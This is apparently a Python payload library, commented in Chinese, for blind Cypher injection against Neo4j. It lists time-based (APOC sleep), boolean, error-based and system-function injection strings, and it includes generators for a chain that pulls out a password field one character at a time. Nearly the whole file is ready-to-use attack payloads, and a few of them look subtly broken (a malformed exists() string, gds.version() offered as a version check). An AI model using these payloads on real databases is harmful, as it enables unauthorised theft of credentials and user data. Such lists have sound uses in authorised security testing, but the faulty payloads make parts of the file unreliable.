"""
Neo4j Cypher盲注載荷
包含基於時間、布爾和錯誤的各種Neo4j Cypher盲注技術
"""

# 時間盲注 - 基於查詢執行時間的注入
TIME_BASED_PAYLOADS = [
    {
        "name": "APOC休眠",
        "value": "' WITH apoc.util.sleep(2000) as delay RETURN delay // ",
        "description": "使用APOC擴展的sleep函數實現時間延遲",
        "expected_delay": 2000,  # 毫秒
        "requires_apoc": True
    },
    {
        "name": "條件APOC休眠",
        "value": "' WITH 1 as one WHERE one=1 WITH (CASE WHEN true THEN apoc.util.sleep(2000) ELSE 0 END) as delay RETURN delay // ",
        "description": "使用CASE WHEN條件語句配合APOC sleep實現有條件的時間延遲",
        "expected_delay": 2000,  # 毫秒
        "requires_apoc": True
    },
    {
        "name": "嵌套循環延遲",
        "value": "' WITH range(1,1000) as r UNWIND r as x WITH collect(x) as c1 UNWIND c1 as y WITH collect(y) as c2 RETURN size(c2) // ",
        "description": "使用UNWIND和collect多次處理集合實現CPU密集操作導致延遲",
        "expected_delay": 1000,  # 毫秒
        "requires_apoc": False
    },
    {
        "name": "大量數據計算",
        "value": "' WITH range(1,10000) as r UNWIND r as x WITH sum(x) as n RETURN n // ",
        "description": "使用大量數據的數學運算實現延遲",
        "expected_delay": 500,  # 毫秒
        "requires_apoc": False
    },
    {
        "name": "日期計算",
        "value": "' WITH datetime() as now, datetime({year:1900}) as old RETURN duration.between(old,now).days // ",
        "description": "使用複雜日期計算實現延遲",
        "expected_delay": 300,  # 毫秒
        "requires_apoc": False
    }
]

# 創建自定義時間盲注
def create_time_based_payload(delay_ms=2000, condition=None):
    """
    生成自定義時間盲注載荷
    
    Args:
        delay_ms (int): 延遲毫秒數
        condition (str): 條件表達式，如 "n.username='admin'"
    
    Returns:
        dict: 包含時間盲注載荷的字典
    """
    if condition:
        return {
            "value": f"' WITH (CASE WHEN {condition} THEN apoc.util.sleep({delay_ms}) ELSE 0 END) as delay RETURN delay // ",
            "expected_delay": delay_ms,
            "requires_apoc": True
        }
    else:
        return {
            "value": f"' WITH apoc.util.sleep({delay_ms}) as delay RETURN delay // ",
            "expected_delay": delay_ms,
            "requires_apoc": True
        }

# 布爾盲注 - 基於查詢結果的注入
BOOLEAN_PAYLOADS = [
    {
        "name": "版本檢測",
        "value": "' RETURN substring(gds.version(), 0, 1) = '2' as result // ",
        "description": "檢測Neo4j版本是否為2.x",
        "data_extraction": True
    },
    {
        "name": "用戶名首字母",
        "value": "' MATCH (u:User) WHERE u.username STARTS WITH 'a' RETURN count(u) > 0 as result // ",
        "description": "檢測是否存在用戶名以'a'開頭的用戶",
        "data_extraction": True
    },
    {
        "name": "密碼長度檢測",
        "value": "' MATCH (u:User) WHERE length(u.password) > 8 RETURN count(u) > 0 as result // ",
        "description": "檢測是否存在密碼長度大於8的用戶",
        "data_extraction": True
    },
    {
        "name": "特定節點存在",
        "value": "' MATCH (n:Admin) RETURN exists((n)) as result // ",
        "description": "檢測是否存在標籤為Admin的節點",
        "data_extraction": True
    },
    {
        "name": "特定關係存在",
        "value": "' MATCH ()-[r:HAS_PERMISSION]->() RETURN count(r) > 0 as result // ",
        "description": "檢測是否存在HAS_PERMISSION類型的關係",
        "data_extraction": True
    }
]

# 創建布爾盲注
def create_boolean_payload(condition):
    """
    生成布爾盲注載荷
    
    Args:
        condition (str): 查詢條件，如 "n.username='admin'"
    
    Returns:
        str: 布爾盲注載荷
    """
    return f"' RETURN exists((' MATCH (n) WHERE {condition} RETURN n')) as result // "

# 字符提取盲注
def create_char_extraction_payload(field, position, char):
    """
    生成字符提取盲注載荷
    
    Args:
        field (str): 要提取的字段路徑，如 "n.password"
        position (int): 要提取的字符位置
        char (str): 要比較的字符
    
    Returns:
        str: 字符提取盲注載荷
    """
    return f"' MATCH (n) WHERE substring({field}, {position}, 1) = '{char}' RETURN count(n) > 0 as result // "

# 錯誤盲注 - 基於查詢錯誤的注入
ERROR_BASED_PAYLOADS = [
    {
        "name": "語法錯誤",
        "value": "' + (CASE WHEN (n.username='admin') THEN '' ELSE to_error('test') END) + '",
        "description": "根據條件觸發語法錯誤",
        "data_extraction": True
    },
    {
        "name": "除零錯誤",
        "value": "' + (CASE WHEN (n.username='admin') THEN '' ELSE 1/0 END) + '",
        "description": "根據條件觸發除零錯誤",
        "data_extraction": True
    },
    {
        "name": "類型錯誤",
        "value": "' + (CASE WHEN (n.username='admin') THEN '' ELSE toInteger('text') END) + '",
        "description": "根據條件觸發類型轉換錯誤",
        "data_extraction": True
    },
    {
        "name": "空值錯誤",
        "value": "' + (CASE WHEN (n.username='admin') THEN '' ELSE head([]) END) + '",
        "description": "根據條件觸發空值錯誤",
        "data_extraction": True
    }
]

# 系統函數盲注 - 使用Neo4j系統函數
SYSTEM_FUNCTION_PAYLOADS = [
    {
        "name": "數據庫名稱",
        "value": "' RETURN apoc.meta.cypher.isType(db.name(), 'example_db') as result // ",
        "description": "檢測數據庫名稱",
        "requires_apoc": True
    },
    {
        "name": "用戶角色檢測",
        "value": "' CALL dbms.showCurrentUser() YIELD roles WITH roles WHERE 'admin' IN roles RETURN count(*) > 0 as result // ",
        "description": "檢測當前用戶是否具有admin角色",
        "requires_apoc": False
    },
    {
        "name": "存儲過程檢測",
        "value": "' CALL dbms.procedures() YIELD name WITH collect(name) as procs RETURN 'apoc' IN procs as result // ",
        "description": "檢測是否安裝了APOC擴展",
        "requires_apoc": False
    }
]

# 數據提取完整盲注套件
def get_data_extraction_chain(target_field="password", known_prefix=""):
    """
    獲取提取數據的完整盲注鏈
    
    Args:
        target_field (str): 目標字段，如 "n.password"
        known_prefix (str): 已知的字段值前綴
    
    Returns:
        list: 盲注鏈，可依次執行
    """
    position = len(known_prefix)
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    return [
        # 檢查長度
        {
            "type": "length",
            "payload": f"' MATCH (n) WHERE length({target_field}) > {position} RETURN count(n) > 0 as result // ",
            "description": f"檢查{target_field}長度是否大於{position}"
        }
    ] + [
        # 逐個字符檢測
        {
            "type": "character",
            "position": position,
            "char": c,
            "payload": f"' MATCH (n) WHERE substring({target_field}, {position}, 1) = '{c}' RETURN count(n) > 0 as result // ",
            "description": f"檢查{target_field}在位置{position}的字符是否為'{c}'"
        } for c in charset
    ] + [
        # 時間盲注也可用於驗證
        {
            "type": "time",
            "position": position,
            "char": c,
            "payload": f"' WITH (CASE WHEN substring({target_field}, {position}, 1) = '{c}' THEN apoc.util.sleep(2000) ELSE 0 END) as delay RETURN delay // ",
            "description": f"檢查{target_field}在位置{position}的字符是否為'{c}'，使用時間延遲",
            "requires_apoc": True
        } for c in charset[:10]  # 僅使用前10個字符進行時間盲注示例
    ] 